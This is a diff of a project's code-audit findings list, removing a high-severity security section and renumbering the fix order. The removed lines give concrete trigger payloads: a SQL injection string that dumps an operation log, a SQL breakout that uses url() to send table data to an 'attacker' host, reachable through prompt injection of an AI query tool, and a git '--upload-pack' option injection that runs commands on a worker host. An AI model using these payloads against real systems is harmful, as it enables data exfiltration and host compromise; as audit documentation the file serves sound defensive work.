@@ -11,36 +11,6 @@ is fixed.
 
 # High
 
-## Security
-
-- **SQL injection in lineage subgraph queries, both directions** —
-  `aaiclick/oplog/lineage.py`, `forward_oplog()` and `backward_oplog()`. The
-  forward frontier loop interpolates the table name unescaped; the backward
-  query and the forward seed use `escape_sql_string`, which escapes quotes but
-  not backslashes. Reached from the read-scope MCP tool `oplog_subgraph`.
-  Trigger: `target_table="x') OR true OR arrayExists(v -> v IN ('x"` with
-  `direction="forward"` dumps the whole operation log.
-- **Scope validation in the AI query tool executes the untrusted SQL** —
-  `aaiclick/ai/agents/lineage_tools.py`, `_explain_statement()` and
-  `validate_scope()`. The SQL is wrapped as `SELECT * FROM (EXPLAIN AST {sql})`
-  and run with no `readonly` or `max_execution_time` settings. Closing the
-  parenthesis and commenting out the trailing `)` executes the rest. `url()`,
-  `remote()`, and `s3()` are not forbidden keywords, so this is SSRF and
-  exfiltration from prompt injection or from the MCP `query_table` tool.
-  Trigger: `SELECT 1) UNION ALL SELECT s FROM url('http://attacker/?d=' ||
-  (SELECT ... FROM any_table), 'RawBLOB', 's String') --`.
-- **bcrypt 5.0.0 raises on passwords over 72 bytes** —
-  `aaiclick/auth/security.py`, `hash_password()` and `verify_password()`.
-  Login with a long password is a 500 for an existing user and a 401
-  otherwise, which enumerates accounts; user creation and admin seeding also
-  crash.
-- **Git option injection from inside a container** —
-  `aaiclick/orchestration/execution/docker_build.py`, `_git_clone_at_sha()`,
-  and `aaiclick/orchestration/factories.py`, `create_task()`. The fetch passes
-  the SHA with no `--`, and only `run_job` validates its format, so container
-  code calling `create_task(git_sha="--upload-pack=<cmd>")` runs `<cmd>` on
-  the worker host through the injected build task.
-
 ## Data correctness
 
 - **`sum()` over narrow integer columns wraps modulo the type** —
@@ -128,12 +98,6 @@ is fixed.
 - **A model-written `SETTINGS` clause overrides the caps on clickhouse-connect**
   — same file, `run_select()`. `readonly=2` permits settings changes and
   query-level SETTINGS win over HTTP-param settings.
-- **URL and export path escaping breaks on backslashes** —
-  `aaiclick/data/object/url.py` (`_describe_url`, JSON path),
-  `aaiclick/data/object/object.py` `insert_from_url()`, and
-  `aaiclick/data/data_context/ch_client.py` `export_query_to_file()`. All
-  inline user strings with quote-only escaping; `quote_sql_literal` in
-  `sql_utils.py` exists for this.
 - **Refresh-token rotation is check-then-act** — `aaiclick/auth/store.py`,
   `_stamp_refresh()`. Two concurrent refreshes with the same token both
   succeed. The UPDATE has no `rotated_at IS NULL` predicate or rowcount check.
@@ -299,10 +263,9 @@ is fixed.
 
 # Fix Order
 
-1. High security (exploitable from a read token or a container).
-2. High data correctness (silent wrong numbers).
-3. Worker crash, missing heartbeat, cancelled-task resurrection, scheduled-job
+1. High data correctness (silent wrong numbers).
+2. Worker crash, missing heartbeat, cancelled-task resurrection, scheduled-job
    config.
-4. Deploy templates, then `SqlConfig.java`.
-5. Remaining Mediums grouped by shared root cause: `escape_sql_string`
-   misuse, missing status guards, missing `try/except` in worker loops.
+3. Deploy templates, then `SqlConfig.java`.
+4. Remaining Mediums grouped by shared root cause: missing status guards,
+   missing `try/except` in worker loops.
